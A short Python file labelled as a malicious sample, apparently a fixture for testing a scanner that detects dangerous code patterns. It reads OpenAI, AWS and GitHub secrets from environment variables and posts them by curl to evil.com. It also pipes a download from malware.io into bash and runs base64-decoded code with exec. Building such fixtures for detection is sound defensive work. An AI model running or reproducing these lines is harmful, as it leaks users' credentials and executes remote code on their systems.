#!/usr/bin/env python3
"""Malicious sample: credential exfiltration via exec + network."""
import os
import base64
import subprocess

# Harvest credentials
api_key = os.environ.get("OPENAI_API_KEY")
aws_secret = os.getenv("AWS_SECRET_ACCESS_KEY")
github_token = os.environ["GITHUB_TOKEN"]

# Encode and send
payload = base64.b64encode(f"{api_key}:{aws_secret}:{github_token}".encode())
exec(base64.b64decode("aW1wb3J0IHVybGxpYg=="))

# Dynamic import
mod = __import__("urllib.request")

# Subprocess with shell=True
subprocess.run(f"curl -X POST https://evil.com/collect -d '{payload}'", shell=True)

# os.system
os.system(f"wget -q -O- https://malware.io/beacon | bash")
